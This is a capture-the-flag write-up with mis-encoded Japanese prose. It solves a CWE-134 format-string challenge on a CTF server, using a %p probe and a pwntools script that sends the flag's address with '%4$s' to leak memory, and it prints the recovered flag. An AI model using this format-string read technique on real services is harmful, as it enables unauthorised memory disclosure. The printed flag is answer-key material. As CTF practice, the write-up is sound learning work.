�܂��́A�ڑ����Ă݂܂��B

CWE-134 �𒲂ׂĂ݂܂��B

```sh
$ nc nc.ctf.setodanote.net 26502
===========================================================
   _______          ________            __ ____  _  _
  / ____\ \        / /  ____|          /_ |___ \| || |
 | |     \ \  /\  / /| |__     ______   | | __) | || |_
 | |      \ \/  \/ / |  __|   |______|  | ||__ <|__   _|
 | |____   \  /\  /  | |____            | |___) |  | |
  \_____|   \/  \/   |______|           |_|____/   |_|

==========================================================

        |
flag    | [0x56652060] >> flag is here <<
        |

Ready > a
Your Inpur : a
```

CWE-134 �́A����������̖��炵���ł��B

�����ɏ������������͂��Ă݂܂��B�ȍ~�A�o�i�[�͓\��܂���B

�Ȃ�قǁA���͂��������񂪁Aprintf�֐��ɂ��̂܂ܓ��͂���Ă����ł��B

```sh
Ready > AAAA%p,%p,%p,%p,%p,%p
Your Inpur : AAAA0xffa26220,0xffa26628,0x56652306,0x41414141,0x252c7025,0x70252c70
```

��̎����ŕ����邱�Ƃ́A�ȉ��ł��B

* �t���O�̃A�h���X�� `0x56652060` �Ƃ������Ƃ��Ǝv���i�A�h���X�͖���ω�����j
* 32bit�v���O���� �� �����͑S�ăX�^�b�N�ɐς܂��
* �������Ă��A4�Ԗڂ� `AAAA` ���o������
* ���͂�������������[�J���ϐ��i�X�^�b�N�j�Ɏ�荞��ł���

`%p` �́A�P���� 16�i���ŕ\�����Ă��邾���ł��B

����� `%s` ���g���ƁA�A�h���X `0x41414141` �Ɋi�[����Ă��镶�����\�����邱�Ƃ��o���܂��B

����āA`0x41414141` �ł͂Ȃ��A�t���O�̃A�h���X�ł��� `0x56652060` ���i�[�����悤�ɂ��āA
4�Ԗڂ� `%s` �ɂ���΁A�t���O���\�������͂��ł��B

�܂�A`AAAA` �̑���ɁA`0x56652060` ��^����΂����Ƃ������ƂɂȂ�܂��B

�t���O�̃A�h���X�͖���ς��̂ŁAPython �Ŏ������܂��B

����K�{�ł͂Ȃ��ł����Aprintf�֐��ɂ́A�_�C���N�g�p�����[�^�A�N�Z�X�Ƃ����̂�����܂��i�S�Ă̏����n�ɂ���킯�ł͂Ȃ���������܂���j�B

�ȒP�Ɍ����ƁA4�Ԗڂ̈����𕶎���ŕ\���������ꍇ�ɁA`%4$s` ���w��ł��܂��B

�������ꂵ�����ƌ����ƁA�������� `%p` ����ׂȂ��Ă��悭�Ȃ�܂��B

�����𓥂܂����������ȉ��ł��B

```python
import os, sys
import argparse

from pwn import *

def main( args ):
    
    proc = remote( 'nc.ctf.setodanote.net', 26502 )
    
    cnt = 0
    while True:
        
        bstr = proc.recvline( timeout=2 )
        print( f"{cnt}: {bstr}, split(): {bstr.split()}" )
        
        if len(bstr) > 0:
            bstr_split = bstr.split()
            
            if b'flag' in bstr_split:
                
                adrs = int( bstr_split[2][1:-1], 16 )
                lst = [ (adrs      ) & 0xFF,
                        (adrs >>  8) & 0xFF,
                        (adrs >> 16) & 0xFF,
                        (adrs >> 24) & 0xFF ]
                
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%p,%p".encode('utf-8')
                #ss = adrs.to_bytes( 4, 'little' ) + "%p,%p,%p,%s,%p".encode('utf-8')
                ss = adrs.to_bytes( 4, 'little' ) + "%4$s".encode('utf-8')
                print( ss.hex() )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
                
                proc.sendline( ss )
                
                bstr = proc.recv( timeout=2 )
                print( f"00: {bstr}" )
        
        else:
            cnt += 1

if __name__ == '__main__':
    
    main( args )
```

���s���܂��B

```sh
$ python tmp.py
[+] Opening connection to nc.ctf.setodanote.net on port 26502: Done
0: b'===========================================================\n', split(): [b'===========================================================']
0: b'   _______          ________            __ ____  _  _   \n', split(): [b'_______', b'________', b'__', b'____', b'_', b'_']
0: b'  / ____\\ \\        / /  ____|          /_ |___ \\| || |  \n', split(): [b'/', b'____\\', b'\\', b'/', b'/', b'____|', b'/_', b'|___', b'\\|', b'||', b'|']
0: b' | |     \\ \\  /\\  / /| |__     ______   | | __) | || |_ \n', split(): [b'|', b'|', b'\\', b'\\', b'/\\', b'/', b'/|', b'|__', b'______', b'|', b'|', b'__)', b'|', b'||', b'|_']
0: b' | |      \\ \\/  \\/ / |  __|   |______|  | ||__ <|__   _|\n', split(): [b'|', b'|', b'\\', b'\\/', b'\\/', b'/', b'|', b'__|', b'|______|', b'|', b'||__', b'<|__', b'_|']
0: b' | |____   \\  /\\  /  | |____            | |___) |  | |  \n', split(): [b'|', b'|____', b'\\', b'/\\', b'/', b'|', b'|____', b'|', b'|___)', b'|', b'|', b'|']
0: b'  \\_____|   \\/  \\/   |______|           |_|____/   |_|  \n', split(): [b'\\_____|', b'\\/', b'\\/', b'|______|', b'|_|____/', b'|_|']
0: b'                                                        \n', split(): []
0: b'========================================================== \n', split(): [b'==========================================================']
0: b'\n', split(): []
0: b'        | \n', split(): [b'|']
0: b'flag    | [0x565c6060] >> flag is here << \n', split(): [b'flag', b'|', b'[0x565c6060]', b'>>', b'flag', b'is', b'here', b'<<']
60605c5625342473
00: b'        | \n\nReady > '
00: b'Your Inpur : ``\\Vflag{Homenum_Revelio_1989}\n'
Traceback (most recent call last):
  File "/home/user/svn/experiment/python/1989.py", line 59, in <module>
    main( args )
  File "/home/user/svn/experiment/python/1989.py", line 13, in main
    bstr = proc.recvline( timeout=2 )
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to nc.ctf.setodanote.net port 26502
```

`flag{Homenum_Revelio_1989}` �ł����B
